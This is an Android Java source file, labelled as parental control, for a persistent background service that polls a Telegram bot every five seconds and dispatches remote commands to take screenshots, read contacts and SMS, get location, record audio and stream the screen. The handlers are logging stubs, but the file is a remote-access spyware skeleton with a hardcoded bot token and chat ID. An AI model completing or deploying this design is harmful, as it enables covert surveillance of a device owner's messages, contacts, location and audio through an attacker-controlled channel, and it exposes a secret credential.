package com.example.parentalcontrol;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import java.io.IOException;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class TelegramService extends Service {
    private static final String TAG = "TelegramService";
    private static final String BOT_TOKEN = "8324231428:AAHP1d7KyMeoS_6c2ax3prOnZHzAA4UU8zc";
    private static final String CHAT_ID = "6387901914";
    private final OkHttpClient client = new OkHttpClient();

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        checkCommands();
                        Thread.sleep(5000); 
                    } catch (Exception e) {
                        Log.e(TAG, "Error checking commands", e);
                    }
                }
            }
        }).start();
        return START_STICKY;
    }

    private void checkCommands() throws IOException {
        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates";
        Request request = new Request.Builder().url(url).build();
        try (Response response = client.newCall(request).execute()) {
            if (response.isSuccessful()) {
                String responseData = response.body().string();
                processCommands(responseData);
            }
        }
    }

    private void processCommands(String data) {
        if (data.contains("/screenshot")) {
            takeScreenshot();
        } else if (data.contains("/volume_up")) {
            adjustVolume(true);
        } else if (data.contains("/volume_down")) {
            adjustVolume(false);
        } else if (data.contains("/get_contacts")) {
            getContacts();
        } else if (data.contains("/get_sms")) {
            getSMS();
        } else if (data.contains("/location")) {
            getLocation();
        } else if (data.contains("/record_audio")) {
            recordAudio();
        } else if (data.contains("/stream_screen")) {
            streamScreen();
        } else if (data.contains("/status")) {
            sendStatus("App is running and connected.");
        }
    }

    private void takeScreenshot() { Log.d(TAG, "Command: Screenshot"); }
    private void adjustVolume(boolean up) { Log.d(TAG, "Command: Volume " + (up ? "Up" : "Down")); }
    private void getContacts() { Log.d(TAG, "Command: Get Contacts"); }
    private void getSMS() { Log.d(TAG, "Command: Get SMS"); }
    private void getLocation() { Log.d(TAG, "Command: Get Location"); }
    private void recordAudio() { Log.d(TAG, "Command: Record Audio"); }
    private void streamScreen() { Log.d(TAG, "Command: Stream Screen (Live View)"); }
    
    private void sendStatus(String message) {
        // Logic to send message back to Telegram
        Log.d(TAG, "Sending status to Telegram: " + message);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
